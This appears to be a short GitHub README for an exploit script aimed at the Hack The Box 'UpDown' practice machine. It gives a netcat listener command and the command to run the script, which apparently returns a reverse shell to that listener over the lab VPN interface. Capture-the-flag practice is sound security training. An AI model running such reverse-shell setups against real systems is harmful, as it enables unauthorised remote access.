# Exploit Script for HTB UpDown
Set up a listener:
```
nc -lvnp <lport>
```
Run the scipt:
```
python3 updown.py <lhost> <lport>
```
<img width="1111" height="715" alt="image" src="https://github.com/user-attachments/assets/777d887b-0bfd-43d4-a6cb-3a48d1137970" />


---
```
python3 updown.py -h
usage: updown.py [-h] ip port

UpDown Exploit

positional arguments:
  ip          Listener IP (tun0)
  port        Listener Port

options:
  -h, --help  show this help message and exit
```
